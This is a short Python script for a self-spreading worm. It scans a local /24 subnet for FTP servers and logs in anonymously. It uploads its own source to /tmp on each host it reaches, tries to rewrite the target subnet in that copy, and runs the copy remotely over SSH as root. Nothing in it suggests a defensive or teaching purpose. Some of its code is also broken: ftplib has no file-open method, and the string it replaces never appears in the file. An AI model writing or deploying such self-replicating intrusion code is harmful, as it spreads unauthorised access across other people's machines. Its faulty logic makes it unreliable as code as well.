import socket
import ftplib
import os
from concurrent.futures import ThreadPoolExecutor

# Define the subnet to scan
subnet = "192.168.1."

# Define the maximum number of threads to use
max_threads = 50


def scan_host(ip):
    # Attempt to connect to port 21 on the host
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((ip, 21))

    if result == 0:
        print("FTP server found at %s" % ip)

        # Attempt anonymous login to FTP server
        try:
            ftp = ftplib.FTP(ip)
            ftp.login()
            print("FTP login successful on %s" % ip)

            # Copy the script to the target machine
            with open(__file__, 'rb') as f:
                ftp.storbinary('STOR /tmp/port_scanner.py', f)
            print("Script copied to %s" % ip)

            # Modify binary at runtime
            with ftp.open('/tmp/port_scanner.py', 'r+') as f:
                content = f.read()
                content = content.replace(b'192.168.1.0/24', bytes(subnet + '0/24', 'utf-8'))
                f.seek(0)
                f.write(content)
                f.truncate()
            print("Script modified on %s" % ip)

            # Execute another scan based on the target's IP subnet
            os.system('ssh root@%s python3 /tmp/port_scanner.py' % ip)
            print("Second scan executed on %s" % ip)

            ftp.quit()
        except ftplib.all_errors as e:
            print("FTP login failed on %s: %s" % (ip, e))
            pass

    sock.close()


# Create a thread pool executor with a maximum number of threads
executor = ThreadPoolExecutor(max_workers=max_threads)

# Loop through each IP address in the subnet and submit a scan job to the executor
for i in range(1, 255):
    ip = subnet + str(i)
    executor.submit(scan_host, ip)

# Wait for all jobs to complete
executor.shutdown(wait=True)
